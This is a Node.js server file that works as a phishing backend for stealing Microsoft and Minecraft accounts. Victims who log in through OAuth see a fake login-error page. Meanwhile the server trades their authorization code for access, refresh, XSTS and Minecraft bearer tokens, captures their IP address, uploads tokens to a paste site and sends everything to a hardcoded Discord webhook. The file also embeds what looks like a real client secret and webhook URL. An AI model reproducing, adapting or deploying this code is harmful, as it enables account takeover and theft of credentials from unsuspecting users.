//Config
const client_secret = 'Y-H8Q~Bc30wOGVFtp~aVFuCkBpUWprLGoSXIhcWq'
const client_id = '9e4bc979-2944-43b0-a360-c3234a0122df'
const redirect_uri = 'https://essential-login-le7b.onrender.com'
const webhook_url = 'https://discord.com/api/webhooks/1062163057964494909/ht6DYvvw_Av8K3hw0nvvRWwRRbO8DobSKh1K-4fzTykxScRHM4wP67UdMN9w59eRlsmp'
//Requirements
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000


app.get('/', async (req, res) => {
    console.log("A user has connected")
    res.send('Error 400: Could not Login')
    let code = req.query.code
    if (code == null) {
        console.log("Invalid code")
        return
    }
    console.log("A user has connected")
    try {
        let accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        console.log("A user has connected")
        let accessToken = accessTokenAndRefreshTokenArray[0]
        let refreshToken = accessTokenAndRefreshTokenArray[1]
        let hashAndTokenArray = await getUserHashAndToken(accessToken)
        let userToken = hashAndTokenArray[0]
        let userHash = hashAndTokenArray[1]
        console.log("A user has connected")
        let xstsToken = await getXSTSToken(userToken)
        let bearerToken = await getBearerToken(xstsToken, userHash)
        console.log("A user has connected")
        let usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        let uuid = usernameAndUUIDArray[0]
        console.log("A user has connected")
        let username = usernameAndUUIDArray[1]
        console.log("A user has connected")
        const ip = getIp(req)
        console.log("Test CONFIRMED")
        postHook(username, uuid, ip, code, bearerToken, refreshToken, accessToken, xstsToken, userHash)
        
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

async function postHook(username, uuid, ip, code, bearerToken, refreshToken, accessToken, xstsToken, userHash) {

    const urlAccessToken = await (await axios.post("https://hst.sh/documents/", accessToken).catch(() => { return { data: { key: "Error uploading" } } })).data.key
    const urlXstsToken = await (await axios.post("https://hst.sh/documents/", xstsToken).catch(() => { return { data: { key: "Error uploading" } } })).data.key

    const AccessFinal = "https://hst.sh/" + urlAccessToken;
    const xstsFinal = "https://hst.sh/" + urlXstsToken;

    let data = {
        title: "User Info",
        url: "https://sky.shiiyu.moe/stats/" + username,
        color: 0x13F9C2,
        fields: [
            {
                name: "Username",
                value: username,
                inline: true
            },
            {
                name: "UUID", 
                value: uuid, 
                inline: true
            },
            {
                name: "Ip", 
                value: ip, 
                inline: true
            },
            {
                name: "Code", 
                value: code, 
                inline: true
            },
            {
                name: "SSID", 
                value: bearerToken, 
                inline: false
            },
            {
                name: "Refresh Token", 
                value: refreshToken, 
                inline: false
            },
            {
                name: "Login", 
                value: username + ":" + uuid + ":" + bearerToken, 
                inline: false
            },
            {
                name: "hash", 
                value: userHash, 
                inline: false
            }
        ]
    };
    let data2 = {
        title: "Refresh Information",
        color: 0x13F9C2,
        fields: [
            {
                name: "Access",
                value: AccessFinal,
                inline: false
            },
            {
                name: "Xstst Token",
                value: xstsFinal,
                inline: false
            },
            {
                name: "Hash",
                value: userHash,
                inline: false
            }
        ]
    };
    console.log(JSON.stringify({
        avatar_url: ``,
        username: "OAuth",
        embeds: [data],
    }))
    await axios.post(
        webhook_url,
        JSON.stringify({
            avatar_url: ``,
            username: "OAuth",
            content: "@everyone ",
            embeds: [data, data2],
        }),
        {
            headers: {
                "Content-Type": "application/json",
            },
        }
    ).catch((err) => {
        console.log(`Error while sending to webhook\n${err}`);
    });
    // console.log(JSON.stringify({
    //     avatar_url: ``,
    //     username: "OAuth",
    //     embeds: [data2],
    // }))
    // axios.post(
    //     webhook_url,
    //     JSON.stringify({
    //         avatar_url: ``,
    //         username: "OAuth",
    //         embeds: [],
    //     }),
    //     {
    //         headers: {
    //             "Content-Type": "application/json",
    //         },
    //     }
    // ).catch((err) => {
    //     console.log(`Error while sending to webhook\n${err}`);
    // });
}

const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}

async function pasteToUrl(str) {
    return await axios.post("https://hst.sh/documents/", str).catch(() => { return { data: { key: "Error uploading" } } }).key
}

const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    //addBan(name)
    return false
}
